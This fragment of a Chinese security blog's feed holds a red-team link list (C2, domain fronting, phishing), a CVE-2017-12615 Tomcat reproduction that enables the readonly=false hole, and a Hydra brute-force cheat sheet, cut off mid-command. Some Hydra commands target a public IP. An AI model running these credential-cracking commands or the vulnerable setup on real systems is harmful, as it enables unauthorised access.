href="https://www.securityartwork.es/2017/01/31/simple-domain-fronting-poc-with-gae-c2-server/" target="_blank" rel="noopener">Simple domain fronting PoC with GAE C2 server</a></li><li><a href="https://www.mdsec.co.uk/2017/02/domain-fronting-via-cloudfront-alternate-domains/" target="_blank" rel="noopener">Domain Fronting Via Cloudfront Alternate Domains</a></li><li><a href="https://theobsidiantower.com/2017/07/24/d0a7cfceedc42bdf3a36f2926bd52863ef28befc.html" target="_blank" rel="noopener">Finding Domain frontable Azure domains - thoth / Fionnbharr (@a_profligate)</a></li><li><a href="https://groups.google.com/forum/#!topic/traffic-obf/7ygIXCPebwQ" target="_blank" rel="noopener">Google Groups: Blog post on finding 2000+ Azure domains using Censys</a></li><li><a href="https://www.cyberark.com/threat-research-blog/red-team-insights-https-domain-fronting-google-hosts-using-cobalt-strike/" target="_blank" rel="noopener">Red Team Insights on HTTPS Domain Fronting Google Hosts Using Cobalt Strike</a></li><li><a href="http://www.rvrsh3ll.net/blog/offensive/ssl-domain-fronting-101/" target="_blank" rel="noopener">SSL Domain Fronting 101</a></li><li><a href="https://www.peew.pw/blog/2018/2/22/how-i-identified-93k-domain-frontable-cloudfront-domains" target="_blank" rel="noopener">How I Identified 93k Domain-Frontable CloudFront Domains</a></li><li><a href="https://medium.com/@vysec.private/validated-cloudfront-ssl-domains-27895822cea3" target="_blank" rel="noopener">Validated CloudFront SSL Domains</a></li><li><a href="https://www.mindpointgroup.com/blog/pen-test/cloudfront-hijacking/" target="_blank" rel="noopener">CloudFront Hijacking</a></li><li><a href="https://github.com/MindPointGroup/cloudfrunt" target="_blank" rel="noopener">CloudFrunt GitHub Repo</a></li></ul><h3 id="Connection-Proxy"><a href="#Connection-Proxy" class="headerlink" title="Connection Proxy"></a>Connection Proxy</h3><ul><li><a href="http://www.rvrsh3ll.net/blog/offensive/redirecting-cobalt-strike-dns-beacons/" target="_blank" rel="noopener">Redirecting Cobalt Strike DNS Beacons</a></li><li><a href="https://github.com/n0pe-sled/Apache2-Mod-Rewrite-Setup" target="_blank" rel="noopener">Apache2Mod Rewrite Setup</a></li><li><a href="https://bluescreenofjeff.com/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/" target="_blank" rel="noopener">Cobalt Strike HTTP C2 Redirectors with Apache mod_rewrite</a></li><li><a href="https://blog.cobaltstrike.com/2017/02/06/high-reputation-redirectors-and-domain-fronting/" target="_blank" rel="noopener">High-reputation Redirectors and Domain Fronting</a></li><li><a href="https://blog.cobaltstrike.com/2014/01/14/cloud-based-redirectors-for-distributed-hacking/" target="_blank" rel="noopener">Cloud-based Redirectors for Distributed Hacking</a></li><li><a href="https://bluescreenofjeff.com/2016-04-12-combatting-incident-responders-with-apache-mod_rewrite/" target="_blank" rel="noopener">Combatting Incident Responders with Apache mod_rewrite</a></li><li><a href="https://bluescreenofjeff.com/2016-04-05-operating-system-based-redirection-with-apache-mod_rewrite/" target="_blank" rel="noopener">Operating System Based Redirection with Apache mod_rewrite</a></li><li><a href="https://bluescreenofjeff.com/2016-03-29-invalid-uri-redirection-with-apache-mod_rewrite/" target="_blank" rel="noopener">Invalid URI Redirection with Apache mod_rewrite</a></li><li><a href="https://bluescreenofjeff.com/2016-03-22-strengthen-your-phishing-with-apache-mod_rewrite-and-mobile-user-redirection/" target="_blank" rel="noopener">Strengthen Your Phishing with Apache mod_rewrite and Mobile User Redirection</a></li><li><a href="https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10" target="_blank" rel="noopener">mod_rewrite rule to evade vendor sandboxes</a></li><li><a href="https://bluescreenofjeff.com/2016-04-19-expire-phishing-links-with-apache-rewritemap/" target="_blank" rel="noopener">Expire Phishing Links with Apache RewriteMap</a></li><li><a href="https://gist.github.com/jivoi/a33ace2e25515a31aa2ffbae246d98c9" target="_blank" rel="noopener">Serving random payloads with NGINX</a></li><li><a href="https://blog.inspired-sec.com/archive/2017/04/17/Mod-Rewrite-Automatic-Setup.html" target="_blank" rel="noopener">Mod_Rewrite Automatic Setup</a></li><li><a href="https://zachgrace.com/2018/02/20/cobalt_strike_redirectors.html" target="_blank" rel="noopener">Hybrid Cobalt Strike Redirectors</a></li><li><a href="https://cybersyndicates.com/2017/04/expand-your-horizon-red-team/" target="_blank" rel="noopener">Expand Your Horizon Red Team – Modern SAAS C2</a></li><li><a href="http://threat.tevora.com/automating-redirector-deployment-with-ansible/" target="_blank" rel="noopener">RTOps: Automating Redirector Deployment With Ansible</a></li></ul><h3 id="Web-Services"><a href="#Web-Services" class="headerlink" title="Web Services"></a>Web Services</h3><ul><li><a href="https://pentestlab.blog/2017/08/29/command-and-control-dropbox/" target="_blank" rel="noopener">C2 with Dropbox</a></li><li><a href="https://pentestlab.blog/2017/08/03/command-and-control-gmail/" target="_blank" rel="noopener">C2 with gmail</a></li><li><a href="https://pentestlab.blog/2017/09/26/command-and-control-twitter/" target="_blank" rel="noopener">C2 with twitter</a></li><li><a href="https://labs.mwrinfosecurity.com/blog/tasking-office-365-for-cobalt-strike-c2/" target="_blank" rel="noopener">Office 365 for Cobalt Strike C2</a></li><li><a href="https://www.cyberark.com/threat-research-blog/red-team-insights-https-domain-fronting-google-hosts-using-cobalt-strike/" target="_blank" rel="noopener">Red Team Insights on HTTPS Domain Fronting Google Hosts Using Cobalt Strike</a></li><li><a href="http://securityblog.gr/4434/a-stealthy-python-based-windows-backdoor-that-uses-github-as-a-cc-server/" target="_blank" rel="noopener">A stealthy Python based Windows backdoor that uses Github as a C&amp;C server</a></li><li><a href="https://www.cobaltstrike.com/help-externalc2" target="_blank" rel="noopener">External C2 (Third-Party Command and Control)</a></li><li><a href="https://outflank.nl/blog/2017/09/17/blogpost-cobalt-strike-over-external-c2-beacon-home-in-the-most-obscure-ways/" target="_blank" rel="noopener">Cobalt Strike over external C2 – beacon home in the most obscure ways</a></li><li><a href="https://github.com/ryhanson/ExternalC2/" target="_blank" rel="noopener">External C2 for Cobalt Strike</a></li><li><a href="http://www.insomniacsecurity.com/2018/01/11/externalc2.html" target="_blank" rel="noopener">External C2 framework for Cobalt Strike</a></li><li><a href="https://github.com/Und3rf10w/external_c2_framework" target="_blank" rel="noopener">External C2 framework - GitHub Repo</a></li><li><a href="https://github.com/Und3rf10w/external_c2_framework" target="_blank" rel="noopener">Hiding in the Cloud: Cobalt Strike Beacon C2 using Amazon APIs</a></li><li><a href="https://blog.xpnsec.com/exploring-cobalt-strikes-externalc2-framework/" target="_blank" rel="noopener">Exploring Cobalt Strike’s ExternalC2 framework</a></li></ul><h3 id="Application-Layer-Protocol"><a href="#Application-Layer-Protocol" class="headerlink" title="Application Layer Protocol"></a>Application Layer Protocol</h3><ul><li><a href="https://pentestlab.blog/2017/12/06/command-and-control-websocket/" target="_blank" rel="noopener">C2 WebSocket</a></li><li><a href="https://pentestlab.blog/2017/11/20/command-and-control-wmi/" target="_blank" rel="noopener">C2 WMI</a></li><li><a href="https://pentestlab.blog/2017/11/14/command-and-control-website/" target="_blank" rel="noopener">C2 Website</a></li><li><a href="https://pentestlab.blog/2018/01/02/command-and-control-images/" target="_blank" rel="noopener">C2 Image</a></li><li><a href="https://pentestlab.blog/2018/01/08/command-and-control-javascript/" target="_blank" rel="noopener">C2 Javascript</a></li><li><a href="https://pentestlab.blog/2018/01/03/command-and-control-web-interface/" target="_blank" rel="noopener">C2 WebInterface</a></li><li><a href="https://pentestlab.blog/2017/09/06/command-and-control-dns/" target="_blank" rel="noopener">C2 with DNS</a></li><li><a href="https://pentestlab.blog/2017/10/04/command-and-control-https/" target="_blank" rel="noopener">C2 with https</a></li><li><a href="https://pentestlab.blog/2017/09/12/command-and-control-webdav/" target="_blank" rel="noopener">C2 with webdav</a></li><li><a href="https://medium.com/@Ne0nd0g/introducing-merlin-645da3c635a" target="_blank" rel="noopener">Introducing Merlin — A cross-platform post-exploitation HTTP/2 Command &amp; Control Tool</a></li><li><a href="https://adapt-and-attack.com/2017/12/19/internetexplorer-application-for-c2/" target="_blank" rel="noopener">InternetExplorer.Application for C2</a></li></ul><h3 id="Infrastructure"><a href="#Infrastructure" class="headerlink" title="Infrastructure"></a>Infrastructure</h3><ul><li><a href="https://rastamouse.me/2017/08/automated-red-team-infrastructure-deployment-with-terraform---part-1/" target="_blank" rel="noopener">Automated Red Team Infrastructure Deployment with Terraform - Part 1</a></li><li><a href="https://rastamouse.me/2017/09/automated-red-team-infrastructure-deployment-with-terraform---part-2/" target="_blank" rel="noopener">Automated Red Team Infrastructure Deployment with Terraform - Part 2</a></li><li><a href="https://rastamouse.me/2018/02/red-team-infrastructure---aws-encrypted-ebs/" target="_blank" rel="noopener">Red Team Infrastructure - AWS Encrypted EBS</a></li><li><a href="https://cybersyndicates.com/2016/11/top-red-team-tips/" target="_blank" rel="noopener">6 RED TEAM INFRASTRUCTURE TIPS</a></li><li><a href="https://www.blackhillsinfosec.com/build-c2-infrastructure-digital-ocean-part-1/" target="_blank" rel="noopener">How to Build a C2 Infrastructure with Digital Ocean – Part 1</a></li><li><a href="https://blog.cobaltstrike.com/2014/09/09/infrastructure-for-ongoing-red-team-operations/" target="_blank" rel="noopener">Infrastructure for Ongoing Red Team Operations</a></li><li><a href="https://posts.specterops.io/attack-infrastructure-log-aggregation-and-monitoring-345e4173044e" target="_blank" rel="noopener">Attack Infrastructure Log Aggregation and Monitoring</a></li><li><a href="https://bluescreenofjeff.com/2017-08-30-randomized-malleable-c2-profiles-made-easy/" target="_blank" rel="noopener">Randomized Malleable C2 Profiles Made Easy</a></li><li><a href="https://blog.cobaltstrike.com/2015/10/21/migrating-your-infrastructure/" target="_blank" rel="noopener">Migrating Your infrastructure</a></li><li><a href="https://pentestlab.blog/2017/07/28/command-and-control-icmp/" target="_blank" rel="noopener">ICMP C2</a></li><li><a href="https://arno0x0x.wordpress.com/2017/09/07/using-webdav-features-as-a-covert-channel/" target="_blank" rel="noopener">Using WebDAV features as a covert channel</a></li><li><a href="https://medium.com/@malcomvetter/safe-red-team-infrastructure-c5d6a0f13fac" target="_blank" rel="noopener">Safe Red Team Infrastructure</a></li><li><a href="https://cybersyndicates.com/2016/12/egressing-bluecoat-with-cobaltstike-letsencrypt/" target="_blank" rel="noopener">EGRESSING BLUECOAT WITH COBALTSTIKE &amp; LET’S ENCRYPT</a></li><li><a href="http://www.harmj0y.net/blog/powershell/command-and-control-using-active-directory/" target="_blank" rel="noopener">Command and Control Using Active Directory</a></li><li><a href="https://blog.cobaltstrike.com/2013/02/12/a-vision-for-distributed-red-team-operations/" target="_blank" rel="noopener">A Vision for Distributed Red Team Operations</a></li><li><a href="https://bluescreenofjeff.com/2017-12-05-designing-effective-covert-red-team-attack-infrastructure/" target="_blank" rel="noopener">Designing Effective Covert Red Team Attack Infrastructure</a></li><li><a href="https://bluescreenofjeff.com/2017-06-13-serving-random-payloads-with-apache-mod_rewrite/" target="_blank" rel="noopener">Serving Random Payloads with Apache mod_rewrite</a></li><li><a href="https://blog.inspired-sec.com/archive/2017/02/14/Mail-Server-Setup.html" target="_blank" rel="noopener">Mail Servers Made Easy</a></li><li><a href="https://thevivi.net/2017/11/03/securing-your-empire-c2-with-apache-mod_rewrite/" target="_blank" rel="noopener">Securing your Empire C2 with Apache mod_rewrite</a></li><li><a href="https://jordan-wright.com/blog/post/2018-02-04-automating-gophish-releases/" target="_blank" rel="noopener">Automating Gophish Releases With Ansible and Docker</a></li><li><a href="https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/" target="_blank" rel="noopener">How to Write Malleable C2 Profiles for Cobalt Strike</a></li><li><a href="https://bluescreenofjeff.com/2017-03-01-how-to-make-communication-profiles-for-empire/" target="_blank" rel="noopener">How to Make Communication Profiles for Empire</a></li><li><a href="http://www.harmj0y.net/blog/redteaming/a-brave-new-world-malleable-c2/" target="_blank" rel="noopener">A Brave New World: Malleable C2</a></li><li><a href="https://www.cobaltstrike.com/help-malleable-c2" target="_blank" rel="noopener">Malleable Command and Control</a></li></ul><h2 id="↑-Embedded-and-Peripheral-Devices-Hacking"><a href="#↑-Embedded-and-Peripheral-Devices-Hacking" class="headerlink" title="↑ Embedded and Peripheral Devices Hacking"></a><a href="#table-of-contents">↑</a> Embedded and Peripheral Devices Hacking</h2><ul><li><a href="https://www.trustwave.com/Resources/SpiderLabs-Blog/Getting-in-with-the-Proxmark-3-and-ProxBrute/" target="_blank" rel="noopener">Gettting in with the Proxmark3 &amp; ProxBrute</a></li><li><a href="https://blog.nviso.be/2017/01/11/a-practical-guide-to-rfid-badge-copying/" target="_blank" rel="noopener">Practical Guide to RFID Badge copying</a></li><li><a href="https://www.tunnelsup.com/contents-of-a-physical-pen-testers-backpack/" target="_blank" rel="noopener">Contents of a Physical Pentester Backpack</a></li><li><a href="https://github.com/samyk/magspoof" target="_blank" rel="noopener">MagSpoof - credit card/magstripe spoofer</a></li><li><a href="https://samy.pl/keysweeper/" target="_blank" rel="noopener">Wireless Keyboard Sniffer</a></li><li><a href="https://blog.kchung.co/rfid-hacking-with-the-proxmark-3/" target="_blank" rel="noopener">RFID Hacking with The Proxmark 3</a></li><li><a href="https://www.cs.bham.ac.uk/~garciaf/publications/Tutorial_Proxmark_the_Swiss_Army_Knife_for_RFID_Security_Research-RFIDSec12.pdf" target="_blank" rel="noopener">Swiss Army Knife for RFID</a></li><li><a href="https://media.blackhat.com/bh-us-12/Briefings/C_Miller/BH_US_12_Miller_NFC_attack_surface_WP.pdf" target="_blank" rel="noopener">Exploring NFC Attack Surface</a></li><li><a href="http://gerhard.dekoninggans.nl/documents/publications/dekoninggans.phd.thesis.pdf" target="_blank" rel="noopener">Outsmarting smartcards</a></li><li><a href="https://blog.kchung.co/reverse-engineering-hid-iclass-master-keys/" target="_blank" rel="noopener">Reverse engineering HID iClass Master keys</a></li><li><a href="https://www.pwnieexpress.com/aopp" target="_blank" rel="noopener">Android Open Pwn Project (AOPP)</a></li></ul><h2 id="↑-Misc"><a href="#↑-Misc" class="headerlink" title="↑ Misc"></a><a href="#table-of-contents">↑</a> Misc</h2><ul><li><a href="https://github.com/vysec/RedTips" target="_blank" rel="noopener">Red Tips of Vysec</a></li><li><a href="https://blog.cobaltstrike.com/2016/02/23/cobalt-strike-tips-for-2016-ccdc-red-teams/" target="_blank" rel="noopener">Cobalt Strike Tips for 2016 ccde red teams</a></li><li><a href="https://blog.cobaltstrike.com/2015/07/09/models-for-red-team-operations/" target="_blank" rel="noopener">Models for Red Team Operations</a></li><li><a href="https://github.com/magoo/redteam-plan" target="_blank" rel="noopener">Planning a Red Team exercise</a></li><li><a href="https://www.youtube.com/watch?v=oclbbqvawQg" target="_blank" rel="noopener">Raphael Mudge - Dirty Red Team tricks</a></li><li><a href="https://posts.specterops.io/introducing-the-adversary-resilience-methodology-part-one-e38e06ffd604" target="_blank" rel="noopener">introducing the adversary resilience methodology part 1</a></li><li><a href="https://posts.specterops.io/introducing-the-adversary-resilience-methodology-part-two-279a1ed7863d" target="_blank" rel="noopener">introducing the adversary resilience methodology part 2</a></li><li><a href="https://medium.com/@malcomvetter/responsible-red-teams-1c6209fd43cc" target="_blank" rel="noopener">Responsible red team</a></li><li><a href="https://bluescreenofjeff.com/2017-05-02-red-teaming-for-pacific-rim-ccdc-2017/" target="_blank" rel="noopener">Red Teaming for Pacific Rim CCDC 2017</a></li><li><a href="https://bluescreenofjeff.com/2015-04-15-how-i-prepared-to-red-team-at-prccdc-2015/" target="_blank" rel="noopener">How I Prepared to Red Team at PRCCDC 2015</a></li><li><a href="https://bluescreenofjeff.com/2016-05-24-pacific-rim-ccdc_2016/" target="_blank" rel="noopener">Red Teaming for Pacific Rim CCDC 2016</a></li><li><a href="https://medium.com/@malcomvetter/responsible-red-teams-1c6209fd43cc" target="_blank" rel="noopener">Responsible Red Teams</a></li></ul><h2 id="↑-RedTeam-Gadgets"><a href="#↑-RedTeam-Gadgets" class="headerlink" title="↑ RedTeam Gadgets"></a><a href="#table-of-contents">↑</a> RedTeam Gadgets</h2><h4 id="Network-Implants"><a href="#Network-Implants" class="headerlink" title="Network Implants"></a>Network Implants</h4><ul><li><a href="https://hackerwarehouse.com/product/lan-tap-pro/" target="_blank" rel="noopener">LAN Tap Pro</a></li><li><a href="https://hakshop.com/collections/network-implants/products/lan-turtle" target="_blank" rel="noopener">LAN Turtle</a></li><li><a href="https://hakshop.com/collections/physical-access/products/bash-bunny" target="_blank" rel="noopener">Bash Bunny</a></li><li><a href="https://hakshop.com/products/packet-squirrel" target="_blank" rel="noopener">Packet Squirrel</a><h4 id="Wifi-Auditing"><a href="#Wifi-Auditing" class="headerlink" title="Wifi Auditing"></a>Wifi Auditing</h4></li><li><a href="https://hakshop.com/products/wifi-pineapple" target="_blank" rel="noopener">WiFi Pineapple</a></li><li><a href="https://hackerwarehouse.com/product/alfa-802-11bgn-long-range-usb-wireless-adapter/" target="_blank" rel="noopener">Alpha Long range Wireless USB</a></li><li><a href="https://www.tindie.com/products/lspoplove/dstike-wifi-deauther-monster/" target="_blank" rel="noopener">Wifi-Deauth Monster</a></li><li><a href="https://www.amazon.com/gp/product/B00VYA3A2U/ref=as_li_tl" target="_blank" rel="noopener">Crazy PA</a><h4 id="IoT"><a href="#IoT" class="headerlink" title="IoT"></a>IoT</h4></li><li><a href="https://hackerwarehouse.com/product/blekey/" target="_blank" rel="noopener">BLE Key</a></li><li><a href="https://hackerwarehouse.com/product/proxmark3-kit/" target="_blank" rel="noopener">Proxmark3</a></li><li><a href="https://www.attify-store.com/products/zigbee-sniffing-tool-atmel-rzraven" target="_blank" rel="noopener">Zigbee Sniffer</a></li><li><a href="https://www.attify-store.com/collections/frontpage/products/jtag-exploitation-kit-with-lab-manual" target="_blank" rel="noopener">Attify IoT Exploit kit</a><h4 id="Software-Defined-Radio-SDR"><a href="#Software-Defined-Radio-SDR" class="headerlink" title="Software Defined Radio - SDR"></a>Software Defined Radio - SDR</h4></li><li><a href="https://hackerwarehouse.com/product/hackrf-one-kit/" target="_blank" rel="noopener">HackRF One Bundle</a></li><li><a href="https://hackerwarehouse.com/product/rtlsdr/" target="_blank" rel="noopener">RTL-SDR</a></li><li><a href="https://hackerwarehouse.com/product/yard-stick-one-kit/" target="_blank" rel="noopener">YARD stick one Bundle</a></li><li><a href="https://hackerwarehouse.com/product/ubertooth-one/" target="_blank" rel="noopener">Ubertooth</a><h4 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h4></li><li><a href="https://hackerwarehouse.com/product/keygrabber/" target="_blank" rel="noopener">Key Grabber</a></li><li><a href="https://store.ryscc.com/products/magspoof%20" target="_blank" rel="noopener">Magspoof</a></li><li><a href="https://samy.pl/poisontap/" target="_blank" rel="noopener">Poison tap</a></li><li><a href="https://samy.pl/keysweeper/" target="_blank" rel="noopener">keysweeper</a></li><li><a href="https://hakshop.com/collections/physical-access/products/usb-rubber-ducky-deluxe" target="_blank" rel="noopener">USB Rubber Ducky</a></li></ul><h2 id="↑-Ebooks"><a href="#↑-Ebooks" class="headerlink" title="↑ Ebooks"></a><a href="#table-of-contents">↑</a> Ebooks</h2><ul><li><a href="https://www.amazon.com/Next-Generation-Teaming-Henry-Dalziel/dp/0128041714" target="_blank" rel="noopener">Next Generation Red Teaming</a></li><li><a href="https://www.amazon.com/Targeted-Cyber-Attacks-Multi-staged-Exploits/dp/0128006048" target="_blank" rel="noopener">Targeted Cyber Attack</a></li><li><a href="https://www.amazon.com/Advanced-Penetration-Testing-Hacking-Networks/dp/1119367689" target="_blank" rel="noopener">Advanced Penetration Testing: Hacking the World’s Most Secure Networks</a></li><li><a href="https://www.amazon.com/Social-Engineers-Playbook-Practical-Pretexting/dp/0692306617/" target="_blank" rel="noopener">Social Engieers’ Playbook Pretical Pretexting</a></li></ul><h2 id="↑-Training-Free"><a href="#↑-Training-Free" class="headerlink" title="↑ Training ( Free )"></a><a href="#table-of-contents">↑</a> Training ( Free )</h2><ul><li><a href="https://www.youtube.com/watch?v=IRpS7oZ3z0o&amp;list=PL9HO6M_MU2nesxSmhJjEvwLhUoHPHmXvz" target="_blank" rel="noopener">Tradecraft - a course on red team operations</a></li><li><a href="https://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes/" target="_blank" rel="noopener">Advanced Threat Tactics Course &amp; Notes</a></li></ul><h2 id="↑-Certification"><a href="#↑-Certification" class="headerlink" title="↑ Certification"></a><a href="#table-of-contents">↑</a> Certification</h2><ul><li><a href="http://www.crest-approved.org/examination/certified-simulated-attack-specialist/" target="_blank" rel="noopener">CREST Certified Simulated Attack Specialist</a></li><li><a href="http://www.crest-approved.org/examination/certified-simulated-attack-manager/" target="_blank" rel="noopener">CREST Certified Simulated Attack Manager</a></li><li><a href="https://www.sans.org/course/red-team-operations-and-threat-emulation" target="_blank" rel="noopener">SEC564: Red Team Operations and Threat Emulation</a></li><li><a href="https://www.elearnsecurity.com/course/penetration_testing_extreme/" target="_blank" rel="noopener">ELearn Security Penetration Testing eXtreme</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Awesome-Red-Teaming&quot;&gt;&lt;a href=&quot;#Awesome-Red-Teaming&quot; class=&quot;headerlink&quot; title=&quot;Awesome Red Teaming&quot;&gt;&lt;/a&gt;Awesome Red Teaming&lt;/h1&gt;&lt;p&gt;List of Awesome Red Team / Red Teaming Resources&lt;/p&gt;
&lt;p&gt;This list is for anyone wishing to learn about Red Teaming but do not have a starting point.&lt;/p&gt;
&lt;p&gt;Anyway, this is a living resources and will update regularly with latest Adversarial Tactics and Techniques based on &lt;a href=&quot;https://attack.mitre.org/wiki/Main_Page&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Mitre ATT&amp;amp;CK&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;You can help by sending Pull Requests to add more information.&lt;/p&gt;
    
    </summary>
    
      <category term="Tools" scheme="https://yaalonsong.github.io/categories/Tools/"/>
    
    
      <category term="Tools" scheme="https://yaalonsong.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-12615漏洞复现</title>
    <link href="https://yaalonsong.github.io/2019/02/28/CVE-2017-12615.html"/>
    <id>https://yaalonsong.github.io/2019/02/28/CVE-2017-12615.html</id>
    <published>2019-02-28T09:49:30.333Z</published>
    <updated>2019-02-28T14:44:54.242Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞利用条件和方式"><a href="#漏洞利用条件和方式" class="headerlink" title="漏洞利用条件和方式:"></a><strong>漏洞利用条件和方式:</strong></h2><ul><li><p>CVE-2017-12615漏洞利用需要在Windows环境，且需要将 readonly 初始化参数由默认值设置为 false，经过实际测试，Tomcat 7.x版本内web.xml配置文件内默认配置无readonly参数，需要手工添加，默认配置条件下不受此漏洞影响。</p><a id="more"></a></li></ul><p>CVE-2017-12616影响范围：Apache Tomcat 7.0.0 - 7.0.80</p><p>CVE-2017-12615影响范围： Apache Tomcat 7.0.0 - 7.0.79</p><h2 id="安装tomcat"><a href="#安装tomcat" class="headerlink" title="安装tomcat"></a>安装tomcat</h2><p><img src="/uploads/tom1.png" alt=""></p><p><strong>U:test</strong></p><p><strong>P:test123</strong></p><p><img src="/uploads/tom2.png" alt=""></p><blockquote><p><strong>JAVA_HOME= C:\Program Files\Java\jdk1.7.0_25</strong></p><p><strong>CLASSPATH= .;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</strong></p><p><strong>Path=  %JAVA_HOME%/bin</strong></p></blockquote><p><strong>新增2个变量</strong></p><blockquote><p>CATALINA_HOME= tomcat路径</p><p>CATALINA_BASE= tomcat路径</p><p>CLASSPATH=;%TALINA_HOME%\common\lib\servlet.jar</p></blockquote><p>1、开始—-控制面板—-系统和安全—-windows防火墙—-高级设置</p><p> 2、选择“入站规则”—-点击“新建规则”—-“规则类型”选择“端口”—-“下一步”—-该规则应用于，选择“TCP”—-“特定本地端口”输入“8080”(Tomcat使用的端口)—-“下一步”—-选择“允许连接”，点击“下一步”—-何时应用该规则，默认全选，点击“下一步”—-为该规则起一个名称，如“Tomcat开放8080端口”—-点击“完成”</p><p>3、Server.xml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;</span><br><span class="line">connectionTimeout=&quot;20000&quot;</span><br><span class="line">redirectPort=&quot;8443&quot; address=&quot;0.0.0.0&quot; /&gt;</span><br></pre></td></tr></table></figure><p>C:\Program Files\Apache Software Foundation\Tomcat 7.0\conf\web.xml</p><p>增加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   &lt;init-param&gt;</span><br><span class="line">   &lt;param-name&gt;readonly&lt;/param-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line"></span><br><span class="line">&lt;/init-param&gt;</span><br></pre></td></tr></table></figure><p><img src="/uploads/tom3.png" alt=""></p><p><img src="/uploads/tom4.png" alt=""></p><p><img src="/uploads/tom5.png" alt=""></p><p><img src="/uploads/tom6.png" alt=""></p><p><img src="/uploads/tom7.png" alt=""></p><p><img src="/uploads/tom8.png" alt=""></p><p><img src="/uploads/tom9.png" alt=""></p><p><img src="/uploads/tom10.png" alt=""></p><blockquote><p>提示 404。通过描述中的 Windows 受影响，可以结合 Windows 的特性。其一是 NTFS 文件流，其二是文件名的相关限制（如 Windows 中文件名不能以空格结尾）来绕过限制：</p></blockquote><p><img src="/uploads/tom11.png" alt=""></p><p><strong><em>7.0.81</em></strong></p><p><img src="/uploads/tom12.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;漏洞利用条件和方式&quot;&gt;&lt;a href=&quot;#漏洞利用条件和方式&quot; class=&quot;headerlink&quot; title=&quot;漏洞利用条件和方式:&quot;&gt;&lt;/a&gt;&lt;strong&gt;漏洞利用条件和方式:&lt;/strong&gt;&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;CVE-2017-12615漏洞利用需要在Windows环境，且需要将 readonly 初始化参数由默认值设置为 false，经过实际测试，Tomcat 7.x版本内web.xml配置文件内默认配置无readonly参数，需要手工添加，默认配置条件下不受此漏洞影响。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞复现" scheme="https://yaalonsong.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="https://yaalonsong.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Hydra 的使用</title>
    <link href="https://yaalonsong.github.io/2019/02/26/hydra-%E7%9A%84%E4%BD%BF%E7%94%A8.html"/>
    <id>https://yaalonsong.github.io/2019/02/26/hydra-的使用.html</id>
    <published>2019-02-26T15:11:39.873Z</published>
    <updated>2019-02-26T15:24:12.702Z</updated>
    
    <content type="html"><![CDATA[<p>字典集<br><a href="https://www.weakpass.com/" target="_blank" rel="noopener">https://www.weakpass.com/</a><br>1.破解ssh<br>（1）破解指定用户名密码</p><blockquote><p>hydra ip ssh -l 用户名 -P 密码字典 -t 线程(默认16) -vV<br>hydra ip ssh -l 用户名 -P 密码字典 -e ns -vV</p></blockquote><a id="more"></a><p>（2）批量破解ssh账号和密码</p><blockquote><p>hydra -L weakpwd.txt -P weakpwd.txt 196.219.53.1 ssh -V<br>hydra -L list_user -P list_password 192.168.56.101 ssh -V</p></blockquote><p>2.破解ftp</p><p>（1）破解指定用户名密码</p><blockquote><p>hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV<br>hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV</p></blockquote><p>（2）批量破解FTP账号和密码</p><blockquote><p>hydra -L weakpwd.txt -P weakpwd.txt 196.219.53.1 ftp -V<br>hydra -L list_user -P list_password 192.168.56.101 ftp -V</p></blockquote><p>3．GET方式提交，破解Web登录</p><blockquote><p>hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/<br>hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php</p></blockquote><p> 4．POST方式提交，破解Web登录4．POST方式提交，破解Web登录</p><p>（1）hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form “/admin/login.php: username= ^USER^ &amp;password=^PASS^&amp;submit=login:sorry password”</p><blockquote><p>hydra -L list_user -P list_password 192.168.0.115 http-post-form “member.php?mod=logging&amp;action=login&amp;loginsubmit=yes&amp;infloat=yes&amp;lssubmit=yes&amp;inajax=1:fastloginfield=username&amp;username=^USER^&amp;password=^PASS^&amp;quickforward=yes&amp;handlekey=ls:Login failed” –V</p></blockquote><p>（2）对admin密码进行破解</p><blockquote><p>hydra -t 3 -l admin -P pass.txt -o out.txt -f 192.168.0.115 http-post-form “login.php:id=^USER^&amp;passwd=^PASS^:<title>wrong username or password</title>“</p></blockquote><p>“-t”表示同时线程数为3；“-l”表示用户名是“admin”，字典为pass.txt，保存为out.txt；“-f”表示破解1个密码就停止；“192.168.0.115”表示目标IP地址；“http-post-form”表示采用HTTP的POST方式提交表单密码破解；</p><p>5．破解HTTPS</p><blockquote><p>hydra -m /index.php -l muts -P pass.txt 192.168.0.115 https</p></blockquote><p>6．破解teamspeak</p><blockquote><p>hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak</p></blockquote><p>7．破解Cisco</p><blockquote><p>hydra -P pass.txt 192.168.0.115 